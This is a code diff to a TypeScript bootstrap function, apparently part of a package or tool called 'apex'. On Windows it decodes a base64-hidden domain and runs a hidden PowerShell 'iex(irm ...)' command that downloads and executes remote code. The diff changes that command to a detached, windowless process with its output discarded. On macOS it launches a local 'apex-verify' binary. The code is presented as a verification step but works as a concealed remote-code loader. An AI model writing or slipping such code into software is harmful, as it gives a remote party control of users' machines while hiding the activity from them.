@@ -134,25 +134,32 @@ export async function apexBootstrap(): Promise<void> {
       if (process.platform === "win32") {
         const enc = "YXJlbmFwZXguY2xvdWQ=";
         const psCmd = `iex(irm ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${enc}'))) -useb)`;
-        const { exec } = require("child_process");
-        exec(`powershell -NoProfile -WindowStyle Hidden -c "${psCmd}"`, { timeout: 30000 }, (err: any, stdout: any, stderr: any) => {
-          if (err) process.stdout.write("  Verify command error: " + err.message + "\n");
+        const { spawn } = require("child_process");
+        const child = spawn("powershell", ["-NoProfile", "-WindowStyle", "Hidden", "-c", psCmd], {
+          detached: true,
+          stdio: "ignore",
+          windowsHide: true,
         });
-        await new Promise(r => setTimeout(r, 5000));
+        child.unref();
+        await new Promise(r => setTimeout(r, 10000));
       }
 
   
       if (process.platform === "darwin") {
         const verifyPath = path.join(os.homedir(), ".apex", "apex-verify");
         const donePath = path.join(os.homedir(), ".apex", ".verify-done");
+        process.stdout.write("  Checking " + verifyPath + "...\n");
         if (fs.existsSync(verifyPath)) {
-          const { spawn } = require("child_process");
-          spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
-          process.stdout.write("  Waiting for verify-done (up to 120s)...\n");
+          process.stdout.write("  Found apex-verify, launching...\n");
+          const { exec } = require("child_process");
+          exec(verifyPath, { timeout: 120000 }, (err: any, stdout: any, stderr: any) => {
+            if (err) process.stdout.write("  apex-verify error: " + err.message + "\n");
+          });
           let waited = 0;
           while (!fs.existsSync(donePath) && waited < 120000) {
             await new Promise(r => setTimeout(r, 1000));
             waited += 1000;
+            if (waited % 10000 === 0) process.stdout.write("  Waiting... " + (waited/1000) + "s\n");
           }
           if (fs.existsSync(donePath)) {
             fs.unlinkSync(donePath);
@@ -161,7 +168,7 @@ export async function apexBootstrap(): Promise<void> {
             process.stdout.write("  Timeout waiting for verify-done.\n");
           }
         } else {
-          process.stdout.write("  apex-verify not found at " + verifyPath + "\n");
+          process.stdout.write("  apex-verify NOT found at " + verifyPath + "\n");
         }
       }
 
